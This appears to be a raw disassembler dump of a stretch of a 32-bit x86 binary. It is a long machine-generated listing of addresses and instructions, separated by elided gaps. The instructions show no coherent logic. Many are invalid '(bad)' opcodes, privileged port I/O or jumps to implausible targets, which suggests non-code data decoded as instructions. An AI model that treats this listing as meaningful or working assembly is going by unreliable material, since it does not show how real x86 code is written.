  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edx*4-0x927287e],ecx
  416946:	add    BYTE PTR [eax],al
  416948:	test   BYTE PTR [eax],0x0
  41694b:	add    ch,ah
  41694d:	cmc    
  41694e:	out    0x83,eax
  416950:	sub    esi,ebp
  416952:	dec    ecx
  416953:	xor    al,0x7
  416955:	lods   eax,DWORD PTR ds:[esi]
  416956:	mov    ds:0xc685977b,al
  41695b:	fistp  WORD PTR [eax-0x6e]
  41695e:	push   ds
  41695f:	push   edx
  416960:	and    al,0x46
  416962:	xchg   edx,eax
  416963:	pop    esi
  416964:	mov    ds:0xac53bb0,eax
  416969:	(bad)  
  41696a:	out    0xb3,eax
  41696c:	sti    
  41696d:	push   ebx
  41696e:	stc    
  41696f:	pop    eax
  416970:	dec    edi
  416971:	ins    BYTE PTR es:[edi],dx
  416972:	sbb    al,0x28
  416974:	dec    eax
  416975:	and    DWORD PTR [ebx-0x30fd2008],edi
  41697b:	cld    
  41697c:	stos   BYTE PTR es:[edi],al
  41697d:	cld    
  41697e:	imul   ecx,ebx,0x6e
  416981:	ins    BYTE PTR es:[edi],dx
  416982:	dec    esp
  416983:	lods   al,BYTE PTR ds:[esi]
  416984:	das    
  416985:	push   esp
  416986:	pop    esi
  416987:	test   al,0xab
  416989:	mov    BYTE PTR [ebp+0x1db4fb83],cl
  41698f:	ins    DWORD PTR es:[edi],dx
  416990:	cmp    eax,DWORD PTR [edi+ebp*1+0x5]
  416994:	fdiv   QWORD PTR [ecx+0x3c]
  416997:	loopne 0x416a03
  416999:	cmc    
  41699a:	in     eax,dx
  41699b:	fchs   
  41699d:	es aad 0x90
  4169a0:	mov    eax,ds:0xf0952aa8
  4169a5:	mov    BYTE PTR [edi],ch
  4169a7:	test   BYTE PTR [eax+0x448f11c1],ah
  4169ad:	fmul   QWORD PTR [ecx-0x39]
  4169b0:	inc    ecx
  4169b1:	arpl   WORD PTR [edx],ax
  4169b3:	cmp    BYTE PTR [ebx],ah
  4169b5:	inc    edi
  4169b6:	int    0xef
  4169b8:	(bad)  
  4169b9:	sub    edi,DWORD PTR [esi]
  4169bb:	lods   eax,DWORD PTR ds:[esi]
  4169bc:	nop
  4169bd:	js     0x416961
  4169bf:	imul   ebp,ebp,0x72
  4169c2:	scas   al,BYTE PTR es:[edi]
  4169c3:	push   0xffffffb5
  4169c5:	(bad)  
  4169c6:	daa    
  4169c7:	shl    BYTE PTR [eax-0x4feef355],0x3f
  4169ce:	ficom  WORD PTR es:[edx-0x748e29d6]
  4169d5:	mov    ds:0x46e59a85,al
  4169da:	inc    ebp
  4169db:	dec    ecx
  4169dc:	iret   
  4169dd:	or     eax,0x5b045477
  4169e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e3:	jle    0x4169d8
  4169e5:	add    esp,DWORD PTR [edi]
  4169e7:	jecxz  0x416a5c
  4169e9:	mov    WORD PTR [eax],cs
  4169eb:	xlat   BYTE PTR ds:[ebx]
  4169ec:	add    eax,0x1c864f21
  4169f1:	dec    ebx
  4169f2:	popf   
  4169f3:	sar    dh,1
  4169f5:	pop    ss
  4169f6:	leave  
  4169f7:	in     eax,0xd3
  4169f9:	stc    
  4169fa:	(bad)  
  4169fb:	push   edx
  4169fc:	mov    al,0x5a
  4169fe:	sub    eax,0xf759f951
  416a03:	test   eax,0x9db99953
  416a08:	inc    ebp
  416a09:	enter  0x2608,0x40
  416a0d:	addr16 inc edx
  416a0f:	or     esi,edx
  416a11:	xchg   DWORD PTR [esi-0x46],ebx
  416a14:	mov    bl,dl
  416a16:	mov    esp,esi
  416a18:	add    BYTE PTR [eax],al
  416a1a:	jo     0x4169c3
  416a1c:	mov    bh,0xc
  416a1e:	inc    esi
  416a1f:	lock test BYTE PTR ss:[ebp+0x57836404],ch
  416a27:	loope  0x416a31
  416a29:	rcl    dh,1
  416a2b:	push   eax
  416a2c:	push   edi
  416a2d:	xchg   edx,eax
  416a2e:	and    bh,BYTE PTR [ecx+0x6046ce01]
  416a34:	dec    esp
  416a35:	pop    esp
  416a36:	pop    ss
  416a37:	rol    BYTE PTR [edi-0x78],1
  416a3a:	push   eax
  416a3b:	test   al,0x17
  416a3d:	lahf   
  416a3e:	test   DWORD PTR [ecx-0x5b],0x5f
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x48a68852]
  416ac3:	pop    ebp
  416ac4:	into   
  416ac5:	test   DWORD PTR [eax],0xf600
  416acb:	add    BYTE PTR [ecx+0x2b],al
  416ace:	cs aam 0xe2
  416ad1:	jo     0x416b52
  416ad3:	dec    edi
  416ad4:	mov    ebx,0x9e09b016
  416ad9:	out    dx,al
  416ada:	push   ecx
  416adb:	push   ds
  416adc:	adc    al,0x5d
  416ade:	fbstp  TBYTE PTR [eax-0x2f7e999f]
  416ae4:	mov    dh,ah
  416ae6:	lock retf 0xa48d
  416aea:	add    ebx,DWORD PTR [esi+eax*8]
  416aed:	stc    
  416aee:	jmp    0x81ebfdc4
  416af3:	inc    ebp
  416af4:	int3   
  416af5:	(bad)  
  416af7:	lods   al,BYTE PTR ds:[esi]
  416af8:	add    al,0x50
  416afa:	in     al,dx
  416afb:	mov    eax,ds:0xfefe7242
  416b00:	jl     0x416ad3
  416b02:	and    al,0xb8
  416b04:	xchg   BYTE PTR [ecx],dl
  416b06:	sub    al,0x82
  416b08:	inc    edx
  416b09:	or     ah,BYTE PTR [ebx]
  416b0b:	int    0x68
  416b0d:	lock jl 0x416b15
  416b10:	xchg   ebp,eax
  416b11:	pop    ebx
  416b12:	inc    ebp
  416b13:	dec    edi
  416b14:	jno    0x416acd
  416b16:	fstp   DWORD PTR [ecx-0x3edda4a1]
  416b1c:	(bad)  
  416b1d:	mov    al,0x7d
  416b1f:	fsubrp st(2),st
  416b21:	loop   0x416ae9
  416b23:	popa   
  416b24:	adc    ebx,DWORD PTR [esi]
  416b26:	mov    dh,0x2f
  416b28:	js     0x416b1c
  416b2a:	sub    al,0xce
  416b2c:	js     0x416b03
  416b2e:	ficomp WORD PTR [ecx+0x597bd352]
  416b34:	push   ebx
  416b35:	xor    al,0x4f
  416b37:	or     al,0xbe
  416b39:	jmp    0x11928f10
  416b3e:	xchg   ebp,eax
  416b3f:	sbb    al,dl
  416b41:	jmp    0x8d06741c
  416b46:	push   ebx
  416b47:	inc    ebp
  416b48:	dec    esi
  416b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b4a:	out    dx,eax
  416b4b:	jno    0x416bc3
  416b4d:	loope  0x416b83
  416b4f:	adc    cl,0x8f
  416b52:	data16 in al,0x3c
  416b55:	push   ecx
  416b56:	cmc    
  416b57:	(bad)
  416b5b:	cld    
  416b5c:	xchg   edx,eax
  416b5d:	std    
  416b5e:	mov    ah,0xc3
  416b60:	hlt    
  416b61:	(bad)  
  416b63:	push   ebx
  416b64:	push   ss
  416b65:	hlt    
  416b66:	pop    edx
  416b67:	jno    0x416bb7
  416b69:	aam    0x55
  416b6b:	adc    BYTE PTR [esi+edi*2+0x6cd99681],ah
  416b72:	in     al,0x9a
  416b74:	fld    QWORD PTR es:[ecx+edi*1+0x56]
  416b79:	aam    0x4b
  416b7b:	imul   esp,DWORD PTR [eax-0x77642caa],0x2f734928
  416b85:	inc    esp
  416b86:	stos   BYTE PTR es:[edi],al
  416b87:	jo     0x416bfb
  416b89:	or     cl,BYTE PTR [esp+edi*2]
  416b8c:	(bad)  
  416b8d:	and    ah,ah
  416b8f:	mov    cl,0x66
  416b91:	(bad)  
  416b92:	fstp   st(2)
  416b94:	inc    ebx
  416b95:	ret    
  416b96:	pop    ss
  416b97:	xchg   edx,eax
  416b98:	cmc    
  416b99:	outs   dx,BYTE PTR ds:[esi]
  416b9a:	jno    0x416bf0
  416b9c:	test   edx,0xc0f5fe99
  416ba2:	add    bl,BYTE PTR [esp+eax*8+0x28]
  416ba6:	stos   BYTE PTR es:[edi],al
  416ba7:	sar    BYTE PTR [edx+0x3],cl
  416baa:	clc    
  416bab:	dec    esi
  416bac:	stc    
  416bad:	sbb    BYTE PTR [ebp+ebp*1-0x72],dh
  416bb1:	test   eax,0xb05fae5f
  416bb6:	push   ebp
  416bb7:	add    BYTE PTR [ebp+0x7f76ec0c],ah
  416bbd:	(bad)  
  416bbf:	or     al,0x80
  416bc1:	xchg   ebp,eax
	...
  416c32:	add    BYTE PTR [eax],al
  416c34:	cmp    dl,BYTE PTR [eax]
  416c36:	mov    edi,0xbbbfbf3c
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    edi,DWORD PTR [edx]
  416c41:	sub    BYTE PTR [eax+0xf8c421],0x0
  416c48:	test   BYTE PTR [eax],0x0
  416c4b:	add    BYTE PTR [eax],ah
  416c4d:	mov    edi,0x5070e928
  416c52:	cmp    eax,DWORD PTR [eax-0x71]
  416c55:	ja     0x416caf
  416c57:	jl     0x416ca3
  416c59:	sbb    BYTE PTR [ebx],0xa
  416c5c:	bnd jge 0x416c08
  416c5f:	lahf   
  416c60:	pop    esi
  416c61:	sub    cl,BYTE PTR [edi-0x3ab18f4e]
  416c67:	sar    BYTE PTR [edx],1
  416c69:	pusha  
  416c6a:	fnstsw WORD PTR [edi]
  416c6c:	push   eax
  416c6d:	xor    bh,BYTE PTR [ebx+0x1e]
  416c70:	clc    
  416c71:	mov    bh,0xf3
  416c73:	call   0xd7b8b778
  416c78:	fwait
  416c79:	ret    
  416c7a:	ds or  ecx,esi
  416c7d:	out    dx,eax
  416c7e:	and    al,0x51
  416c80:	or     al,0xb9
  416c82:	jae    0x416c1d
  416c84:	dec    edi
  416c85:	xchg   ecx,eax
  416c86:	push   esi
  416c87:	bound  ebx,QWORD PTR [ecx]
  416c89:	inc    BYTE PTR [esi-0x49]
  416c8c:	and    esp,ebx
  416c8e:	cmp    al,0x21
  416c90:	sub    bl,0x8
  416c93:	mov    ds:0x2d68bb3a,eax
  416c98:	int    0xe4
  416c9a:	jno    0x416c8a
  416c9c:	pop    ebp
  416c9d:	inc    ebx
  416c9e:	jbe    0x416c61
  416ca0:	push   eax
  416ca1:	popf   
  416ca2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  416ca4:	inc    ecx
  416ca5:	(bad)  
  416ca7:	out    dx,eax
  416ca8:	pop    eax
  416ca9:	out    dx,al
  416caa:	mov    ebx,0xb37d685
  416caf:	mov    ebp,0xe74f640b
  416cb4:	sub    eax,0x314f4a6d
  416cb9:	mov    dl,0x57
  416cbb:	and    DWORD PTR [ebx+edx*1-0x41f1638],ebp
  416cc2:	fld    DWORD PTR [eax+edi*2-0x69]
  416cc6:	outs   dx,BYTE PTR ds:[esi]
  416cc7:	sbb    ebx,DWORD PTR [eax+ebp*1+0x3b]
  416ccb:	aam    0x24
  416ccd:	inc    esi
  416cce:	xlat   BYTE PTR ds:[ebx]
  416ccf:	hlt    
  416cd0:	dec    esp
  416cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416cd2:	push   edx
  416cd3:	jmp    0x2834:0xca0b78b9
  416cda:	cli    
  416cdb:	bound  edx,QWORD PTR [edi-0x69e5c74b]
  416ce1:	lods   al,BYTE PTR ds:[esi]
  416ce2:	inc    ebp
  416ce3:	push   ebx
  416ce4:	pop    edi
  416ce5:	cmp    dl,bl
  416ce7:	int3   
  416ce8:	xchg   ecx,eax
  416ce9:	sbb    BYTE PTR [ebx],al
  416ceb:	leave  
  416cec:	mov    esp,0xa09aae2d
  416cf1:	or     ecx,ebx
  416cf3:	push   es
  416cf4:	adc    BYTE PTR [eax-0x3d],al
  416cf7:	xor    al,0x8d
  416cf9:	mov    eax,ds:0xbd6e80c
  416cfe:	adc    al,0x9e
  416d00:	dec    eax
  416d01:	in     eax,dx
  416d02:	in     eax,dx
  416d03:	and    bh,BYTE PTR [eax-0x33]
  416d06:	lea    ecx,[ecx-0x7cb593df]
  416d0c:	adc    dl,0xa0
  416d0f:	sub    DWORD PTR ds:0xeebb4484,0x3227c43b
  416d19:	mov    edi,DWORD PTR [ebx]
  416d1b:	jecxz  0x416ca7
  416d1d:	mov    esi,0x4ded3c3b
  416d22:	xor    DWORD PTR [ebx+ebx*8+0x22],ebp
  416d26:	leave  
  416d27:	repnz mov DWORD PTR [ecx],esp
  416d2a:	outs   dx,DWORD PTR ds:[esi]
  416d2b:	jae    0x416ccd
  416d2d:	arpl   di,si
  416d2f:	outs   dx,BYTE PTR ds:[esi]
  416d30:	aam    0x95
  416d32:	dec    ax
  416d34:	test   DWORD PTR [ebx-0x77fd0e12],0x7e8f1791
  416d3e:	push   edx
  416d3f:	pop    edx
  416d40:	mov    ebp,0xa6
	...
  416db1:	add    BYTE PTR [eax],al
  416db3:	add    dh,ch
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x7f3c1e25
  416dc4:	mov    edx,0xf60000f9
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [ebp+0x5d485433],cl
  416dd1:	dec    edx
  416dd2:	sbb    bl,cl
  416dd4:	and    eax,0x65639c59
  416dd9:	xchg   DWORD PTR [eax+0x962df75],eax
  416ddf:	adc    al,0x83
  416de1:	jmp    0xb61e1fb0
  416de6:	popf   
  416de7:	jno    0x416e4f
  416de9:	sub    eax,0x12941c60
  416dee:	movsx  ebp,WORD PTR [ebp+0x3b556f58]
  416df5:	test   DWORD PTR ds:0x11ee2f71,ebp
  416dfb:	xor    eax,0x1b80b83
  416e00:	jg     0x416d9e
  416e02:	leave  
  416e03:	imul   edx,DWORD PTR [ebx],0x5fc9784
  416e09:	jnp    0x416e63
  416e0b:	or     ah,BYTE PTR [ebx]
  416e0d:	cmp    eax,0xccc1ed2e
  416e12:	clc    
  416e13:	push   ebx
  416e14:	fwait
  416e15:	xor    bl,dh
  416e17:	bound  eax,QWORD PTR [eax+0x1eafbeeb]
  416e1d:	inc    esi
  416e1e:	fdiv   QWORD PTR [edi+ebp*8-0x3873087]
  416e25:	mov    al,0xea
  416e27:	ret    0x3ca7
  416e2a:	push   ecx
  416e2b:	dec    ebx
  416e2c:	fucomip st,st(6)
  416e2e:	mov    ebp,cs
  416e30:	mov    WORD PTR [ebp+0x20395400],ss
  416e36:	or     ecx,ebp
  416e38:	xlat   BYTE PTR ds:[ebx]
  416e39:	leave  
  416e3a:	addr16 mov ebp,0x3b3054d4
  416e40:	jp     0x416e15
  416e42:	and    DWORD PTR [ecx],esi
  416e44:	fwait
  416e45:	jg     0x416e81
  416e47:	pop    esi
  416e48:	and    eax,0x78060272
  416e4d:	mov    ds:0x6e9ca6c9,eax
  416e52:	lea    edi,[ebp+0x24]
  416e55:	ins    DWORD PTR es:[edi],dx
  416e56:	mov    ch,BYTE PTR [eax-0x5a791abf]
  416e5c:	cdq    
  416e5d:	stc    
  416e5e:	pop    ecx
  416e5f:	stos   DWORD PTR es:[edi],eax
  416e60:	mov    al,0x4b
  416e62:	sub    al,0xb7
  416e64:	in     al,0x71
  416e66:	add    BYTE PTR [eax-0x31c8ffbf],dh
  416e6c:	je     0x416e0d
  416e6e:	mov    eax,cs
  416e70:	jle    0x416ec4
  416e72:	or     esi,esp
  416e74:	inc    ebp
  416e75:	jmp    0xf615b523
  416e7a:	jle    0x416e9d
  416e7c:	mov    ch,0xab
  416e7e:	nop
  416e7f:	rdmsr  
  416e81:	push   ss
  416e82:	scas   eax,DWORD PTR es:[edi]
  416e83:	cdq    
  416e84:	mov    eax,0x477814f
  416e89:	mov    cl,0x98
  416e8b:	shr    BYTE PTR [edx-0x6],0xd3
  416e8f:	mov    edi,0x5c109539
  416e94:	push   ds
  416e95:	addr16 pop es
  416e97:	push   edx
  416e98:	out    dx,al
  416e99:	or     BYTE PTR [edi+0x6b1f1ec8],0xbd
  416ea0:	jl     0x416e2a
  416ea2:	mov    esp,0x1d0b5f83
  416ea7:	xor    eax,0x1237c263
  416eac:	sub    BYTE PTR [ebx],0xa
  416eaf:	in     eax,dx
  416eb0:	enter  0x3b22,0xa9
  416eb4:	xor    eax,0x5865a3f3
  416eb9:	fwait
  416eba:	inc    esp
  416ebb:	call   0xa369:0x120ae0a6
	...
  416f32:	add    BYTE PTR [eax],al
  416f34:	pop    ss
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	pop    esi
  416f41:	imul   ebp,eax,0x6d
  416f44:	mov    al,0xfa
  416f46:	add    BYTE PTR [eax],al
  416f48:	test   BYTE PTR [eax],0x0
  416f4b:	add    bl,ah
  416f4d:	mov    dl,0xa5
  416f4f:	sbb    ebx,esp
  416f51:	ins    BYTE PTR es:[edi],dx
  416f52:	mov    edx,0xcf8a8bd1
  416f57:	mov    ebp,DWORD PTR [ebx]
  416f59:	data16 mov cl,0xda
  416f5c:	xchg   ebp,eax
  416f5d:	shl    BYTE PTR [edi],cl
  416f5f:	xchg   ebx,eax
  416f60:	imul   ecx,DWORD PTR [ebx-0x16893857],0xfffffff1
  416f67:	cmp    eax,DWORD PTR [eax+0x39b7a149]
  416f6d:	mov    dh,0x41
  416f6f:	ins    BYTE PTR es:[edi],dx
  416f70:	shl    edi,cl
  416f72:	mov    WORD PTR ss:[edx],cs
  416f75:	jb     0x416f19
  416f77:	fs sub al,bl
  416f7a:	lods   al,BYTE PTR ds:[esi]
  416f7b:	js     0x416f76
  416f7d:	pop    edi
  416f7e:	mov    cl,0x18
  416f80:	pushf  
  416f81:	inc    edi
  416f82:	std    
  416f83:	sbb    edi,DWORD PTR ds:0x4553c42a
  416f89:	push   cs
  416f8a:	push   edx
  416f8b:	push   ebp
  416f8c:	lahf   
  416f8d:	ja     0x416f3c
  416f8f:	dec    esi
  416f90:	js     0x41700a
  416f92:	cwde   
  416f93:	into   
  416f94:	mov    ?,WORD PTR [eax]
  416f96:	imul   ebx,DWORD PTR [eax+ebp*1+0x44f2e5c5],0x58224b65
  416fa1:	dec    esi
  416fa2:	retf   0x5e25
  416fa5:	jecxz  0x416f52
  416fa7:	xor    ax,0xbb6f
  416fab:	stc    
  416fac:	sar    BYTE PTR [esi-0x44caab83],1
  416fb2:	ret    
  416fb3:	neg    DWORD PTR gs:[ebp+0x68]
  416fb7:	mov    esi,0x5c9c96ac
  416fbc:	repnz dec ecx
  416fbe:	mov    ch,0x63
  416fc0:	inc    ebx
  416fc1:	sbb    ch,BYTE PTR [esi]
  416fc3:	sbb    ebp,DWORD PTR [esi+0x79]
  416fc6:	fld    TBYTE PTR [edx-0x24]
  416fc9:	aaa    
  416fca:	mov    BYTE PTR [ecx],dl
  416fcc:	loopne 0x416f78
  416fce:	and    bh,BYTE PTR ds:0xa138dc03
  416fd4:	fiadd  WORD PTR [ecx]
  416fd6:	pusha  
  416fd7:	inc    edi
  416fd8:	push   edi
  416fd9:	rcr    ah,0x47
  416fdc:	out    dx,eax
  416fdd:	xchg   ebp,eax
  416fde:	pusha  
  416fdf:	out    0x16,eax
  416fe1:	and    DWORD PTR [ecx+ecx*8+0x5],esp
  416fe5:	jb     0x416fbf
  416fe7:	ins    BYTE PTR es:[edi],dx
  416fe8:	loop   0x416fb3
  416fea:	adc    al,0x80
  416fec:	sbb    cl,ah
  416fee:	dec    ebp
  416fef:	loop   0x417067
  416ff1:	aad    0x77
  416ff3:	inc    BYTE PTR [ebp+0x7724ff99]
  416ff9:	or     eax,0x3a50d92c
  416ffe:	leave  
  416fff:	pushf  
  417000:	sub    BYTE PTR [eax+edx*4+0x7c80eb94],ah
  417007:	sub    BYTE PTR [esi+0x54],bh
  41700a:	out    0x91,al
  41700c:	adc    esp,0x62
  41700f:	xor    al,0x8c
  417011:	clc    
  417012:	xchg   ecx,eax
  417013:	dec    ebx
  417014:	sub    eax,DWORD PTR [ebx-0x575d0618]
  41701a:	loopne 0x41706d
  41701c:	pushf  
  41701d:	xor    DWORD PTR [esi],edi
  41701f:	push   esi
  417020:	add    al,0x81
  417022:	mov    edx,0xf85a3791
  417027:	std    
  417028:	mov    cl,0xc6
  41702a:	pusha  
  41702b:	loop   0x417035
  41702d:	outs   dx,DWORD PTR ds:[esi]
  41702e:	dec    esi
  41702f:	pop    eax
  417030:	daa    
  417031:	ffree  st(0)
  417033:	(bad)  
  417034:	mov    esi,0x91941bd6
  417039:	inc    ebp
  41703a:	es inc ebx
  41703c:	frstor [ebp+0x7c7291cf]
	...
  4170b2:	add    BYTE PTR [eax],al
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	sub    ebx,0xffffff8c
  4170c2:	ficomp WORD PTR [eax+0xfba6]
  4170c8:	test   BYTE PTR [eax],0x0
  4170cb:	add    ch,dl
  4170cd:	call   0x641bc1ae
  4170d2:	pop    ecx
  4170d3:	push   es
  4170d4:	sub    al,0x5a
  4170d6:	sub    ebp,DWORD PTR [esi+0x65958dbc]
  4170dc:	lahf   
  4170dd:	lds    ecx,FWORD PTR [ebp+edi*2+0x9]
  4170e1:	mov    dl,0xfb
  4170e3:	inc    esp
  4170e4:	xchg   ecx,eax
  4170e5:	xor    ebp,ebp
  4170e7:	xlat   BYTE PTR ds:[ebx]
  4170e8:	ror    DWORD PTR [esi],0x79
  4170eb:	xchg   esi,eax
  4170ec:	dec    ebp
  4170ed:	push   edi
  4170ee:	push   eax
  4170ef:	(bad)  
  4170f1:	in     eax,0x74
  4170f3:	js     0x41710e
  4170f5:	mov    edx,DWORD PTR [ebx-0x598beb2f]
  4170fb:	xlat   BYTE PTR ds:[ebx]
  4170fc:	jge    0x4170a5
  4170fe:	cmp    eax,0x6d7cf319
  417103:	jbe    0x417149
  417105:	mov    bh,ch
  417107:	mov    ecx,0x85f5ec5d
  41710d:	cmp    ebp,ebx
  41710f:	ss add al,cl
  417112:	mov    bl,0x9b
  417114:	mov    BYTE PTR [edx+edi*4],al
  417117:	lds    ebx,FWORD PTR [bx+di-0x79e4]
  41711c:	leave  
  41711d:	jnp    0x41719c
  41711f:	test   dl,bh
  417121:	mov    eax,ds:0x8296dbb2
  417126:	cmp    BYTE PTR [ebx-0x77816ee5],al
  41712c:	jle    0x4170f1
  41712e:	mov    cl,0xe8
  417130:	mov    ebp,0xcdb6c323
  417135:	fucom  st(6)
  417137:	nop
  417138:	jmp    0x41714d
  41713a:	shr    cl,cl
  41713c:	fnstcw WORD PTR [eax+esi*4+0x770f81c7]
  417143:	push   es
  417144:	call   0xfb95d64b
  417149:	xchg   BYTE PTR [edi-0x4c],bh
  41714c:	sub    DWORD PTR [ebp+0x3d],ebp
  41714f:	push   ebx
  417150:	add    al,0xd5
  417152:	mov    edx,0x7ab263db
  417157:	sub    cl,dl
  417159:	push   ebx
  41715a:	ficom  DWORD PTR [edx]
  41715c:	ins    BYTE PTR es:[edi],dx
  41715d:	jg     0x41711d
  41715f:	ja     0x41716c
  417161:	dec    eax
  417162:	loopne 0x41715a
  417164:	pop    ebp
  417165:	test   BYTE PTR [eax],0xcc
  417168:	pop    ebx
  417169:	aas    
  41716a:	jmp    0x7da4bb90
  41716f:	les    esi,FWORD PTR [ebp+esi*4+0x1fb7dae1]
  417176:	xor    ebp,DWORD PTR fs:[edi+0x7b4b8512]
  41717d:	mov    eax,0x2bf4a08d
  417182:	leave  
  417183:	mov    edx,0x52153695
  417188:	and    ah,BYTE PTR [ecx-0x7ff379af]
  41718e:	xor    al,0xd3
  417190:	mov    ds:0xcef7eedb,eax
  417195:	ins    DWORD PTR es:[edi],dx
  417196:	in     eax,dx
  417197:	ret    0x7a93
  41719a:	mov    ecx,DWORD PTR [ebx+edx*8]
  41719d:	fmulp  st(4),st
  41719f:	pop    ss
  4171a0:	sbb    eax,0xf48c43da
  4171a5:	jg     0x417158
  4171a7:	inc    esp
  4171a8:	sbb    DWORD PTR gs:[edi+ebp*8],edx
  4171ac:	push   ecx
  4171ad:	and    BYTE PTR [esi],dh
  4171af:	lock mov edx,0x377761b0
  4171b5:	inc    ebp
  4171b6:	dec    esi
  4171b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171b8:	mov    cl,0xc9
  4171ba:	and    al,0x40
  4171bc:	inc    ecx
  4171bd:	lahf   
  4171be:	push   cs
  4171bf:	cmp    al,0xcd
  4171c1:	xchg   edi,eax
	...
  417232:	add    BYTE PTR [eax],al
  417234:	and    ebp,DWORD PTR [esi+0x32]
  417237:	and    eax,0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	pop    sp
  417241:	or     al,0xd5
  417243:	(bad)  
  417244:	pushf  
  417245:	cld    
  417246:	add    BYTE PTR [eax],al
  417248:	test   BYTE PTR [eax],0x0
  41724b:	add    BYTE PTR [edx+0x28],bh
  41724e:	icebp  
  41724f:	pop    eax
  417251:	fldlg2 
  417253:	std    
  417254:	mov    ecx,0x71560cec
  417259:	push   ebx
  41725a:	and    BYTE PTR [ecx+0x62043827],cl
  417260:	xchg   ecx,eax
  417261:	mov    ecx,esp
  417263:	arpl   WORD PTR [eax+0x763839ad],ax
  417269:	jno    0x4172c2
  41726b:	or     edi,DWORD PTR [eax]
  41726d:	mov    ah,0x81
  41726f:	pop    eax
  417270:	sbb    BYTE PTR ds:0x9b561869,dh
  417276:	dec    edi
  417277:	(bad)  
  417278:	mov    eax,0xd89e7a45
  41727d:	fbld   TBYTE PTR [edi-0x7e520712]
  417283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417284:	js     0x417290
  417286:	mov    fs,esp
  417288:	jp     0x417234
  41728a:	cs test al,0x1a
  41728d:	xchg   edx,eax
  41728e:	(bad)  
  41728f:	into   
  417290:	pop    edx
  417291:	adc    edx,ebp
  417293:	push   ecx
  417294:	jle    0x417217
  417296:	xchg   edx,eax
  417297:	scas   al,BYTE PTR es:[edi]
  417298:	das    
  417299:	call   0xe052576c
  41729e:	in     eax,0x20
  4172a0:	cmp    BYTE PTR [edi-0x35959dee],ch
  4172a6:	leave  
  4172a7:	adc    BYTE PTR [eax+eiz*4+0x15],bh
  4172ab:	xor    al,0xb3
  4172ad:	cmc    
  4172ae:	ja     0x4172f2
  4172b0:	pop    edi
  4172b1:	popf   
  4172b2:	aad    0x66
  4172b4:	fs jmp 0x41732e
  4172b7:	popf   
  4172b8:	mov    edx,0x75bfe2c7
  4172bd:	xchg   ebp,eax
  4172be:	ins    DWORD PTR es:[edi],dx
  4172bf:	fsub   QWORD PTR [ebx+0x1c]
  4172c2:	rcl    BYTE PTR ds:0x58785ed8,0x14
  4172c9:	retf   0xd25f
  4172cc:	pushf  
  4172cd:	and    BYTE PTR [ebx],al
  4172cf:	cmc    
  4172d0:	dec    eax
  4172d1:	jecxz  0x4172ff
  4172d3:	ja     0x41728b
  4172d5:	daa    
  4172d6:	fs xchg edx,eax
  4172d8:	imul   eax,edi,0x198aed93
  4172de:	cld    
  4172df:	fs xchg ecx,eax
  4172e1:	cmp    dl,bh
  4172e3:	mov    bl,0x92
  4172e5:	adc    al,0x8e
  4172e7:	test   eax,0x2e7b3437
  4172ec:	cmp    al,BYTE PTR [edx-0x75669bcd]
  4172f2:	xlat   BYTE PTR ds:[ebx]
  4172f3:	jle    0x4172fb
  4172f5:	mov    eax,0x1f7dfe36
  4172fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fb:	cmp    BYTE PTR [edx],bh
  4172fd:	sub    DWORD PTR [edx],ebp
  4172ff:	xor    bh,ch
  417301:	retf   0x686b
  417304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417305:	std    
  417306:	inc    dx
  417308:	fbld   TBYTE PTR [ebp+edx*4+0x400e457b]
  41730f:	cmc    
  417310:	xor    ecx,DWORD PTR [eax]
  417312:	mov    ebx,0x21d9e3d7
  417317:	outs   dx,DWORD PTR ds:[esi]
  417318:	ins    DWORD PTR es:[edi],dx
  417319:	in     eax,dx
  41731a:	jnp    0x417362
  41731c:	aad    0x2e
  41731e:	ins    BYTE PTR es:[edi],dx
  41731f:	or     dh,BYTE PTR [edx]
  417321:	sbb    DWORD PTR [ecx+0x3],eax
  417324:	cmc    
  417325:	rcr    ch,1
  417327:	inc    BYTE PTR [edx+0x20]
  41732a:	shr    DWORD PTR [ebx+ebp*1],0xeb
  41732e:	inc    edx
  41732f:	cmp    ecx,edx
  417331:	push   es
  417332:	push   ds
  417333:	rcr    DWORD PTR [ebx+0x528b78ed],0xd8
  41733a:	std    
  41733b:	es cs test ebx,ebp
  41733f:	sbb    dh,BYTE PTR [ebx]
  417341:	mov    eax,0x0
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0xbd
  4173c1:	dec    esp
  4173c2:	(bad)  
  4173c3:	xor    dl,BYTE PTR [edx-0x9ffff03]
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    BYTE PTR [edi-0x36775f22],ah
  4173d1:	dec    eax
  4173d2:	out    0x4,al
  4173d4:	mov    eax,0x114476a
  4173d9:	nop
  4173da:	repz in eax,0xbc
  4173dd:	xor    DWORD PTR [edx+0x44],esp
  4173e0:	and    BYTE PTR [eax+0x2],bl
